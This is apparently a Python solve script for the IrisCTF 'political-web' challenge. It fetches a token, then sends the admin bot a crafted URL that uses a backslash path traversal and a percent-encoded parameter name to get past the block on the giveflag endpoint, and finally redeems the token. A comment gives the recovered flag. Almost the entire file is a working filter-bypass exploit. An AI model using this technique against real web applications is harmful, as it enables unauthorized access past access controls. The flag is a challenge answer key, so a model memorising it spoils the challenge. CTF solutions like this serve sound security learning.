import requests
from pwn import remote
import time

LOCAL = False

if LOCAL:
    url = "http://localhost:1339/"
    bot = remote('localhost', 1337)
else:
    url = "https://political-web.chal.irisc.tf/"
    bot = remote('political-bot.chal.irisc.tf', 1337)

s = requests.Session()

token = s.get(url + 'token').text
print(token)

bot.sendlineafter(b'to open.', f'{url}/a/..\\giveflag?a=1&toke%6e={token}&b=2')

time.sleep(2)
r = s.post(url+'redeem', data={'token': token})

print(r.text)

# irisctf{flag_blocked_by_admin}
